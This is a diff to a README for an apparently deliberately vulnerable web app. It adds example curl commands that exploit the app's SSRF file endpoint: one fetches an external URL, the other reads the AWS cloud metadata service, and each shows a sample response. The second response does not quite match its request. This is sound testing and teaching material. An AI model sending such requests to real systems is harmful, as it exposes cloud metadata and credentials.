@@ -330,6 +330,74 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **Server-Side Request Forgery (SSRF)** - The endpoint /api/file receives the _path_ and _type_ query parameters and returns the content of the file in _path_ with Content-Type value from the _type_ parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
   There are specific endpoints for each cloud provider as well - `/api/file/google`, `/api/file/aws`, `/api/file/azure`, `/api/file/digital_ocean`.
+  <details>
+    <summary>Example Exploitation of Server-Side Request Forgery (SSRF)</summary>
+
+  To demonstrate SSRF, you can use the following `curl` commands:
+
+  1. **Triggering a Request to an External Resource**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/file?path=https://httpbin.org/get'
+     ```
+
+     Example Response:
+
+     ```json
+     {
+       "args": {},
+       "headers": {
+         "Accept": "application/json, text/plain, */*",
+         "Accept-Encoding": "gzip, compress, deflate, br",
+         "Host": "httpbin.org",
+         "User-Agent": "axios/1.7.7",
+         "X-Amzn-Trace-Id": "Root=1-67ea5603-2599f0b04e318fa9241a659d"
+       },
+       "origin": "18.212.149.236",
+       "url": "https://httpbin.org/get"
+     }
+     ```
+
+     This demonstrates that the server can be used to make requests to external resources.
+
+  2. **Triggering a Request to an Internal Network Resource**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/file?path=http://169.254.169.254/latest/meta-data/ami-id'
+     ```
+
+     Example Response:
+
+     ```text
+     ami-id
+     ami-launch-index
+     ami-manifest-path
+     block-device-mapping/
+     events/
+     hostname
+     iam/
+     instance-action
+     instance-id
+     instance-life-cycle
+     instance-type
+     local-hostname
+     local-ipv4
+     mac
+     metrics/
+     network/
+     placement/
+     profile
+     public-hostname
+     public-ipv4
+     public-keys/
+     reservation-id
+     security-groups
+     services/%
+     ```
+
+     This demonstrates that the server can access internal network resources, which could expose sensitive information.
+
+  </details>
 
 - **SQL injection (SQLi)** - The `/api/testimonials/count` endpoint receives and executes SQL query in the query parameter. Similarly, the `/api/products/views` endpoint utilizes the `x-product-name` header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
   <details>
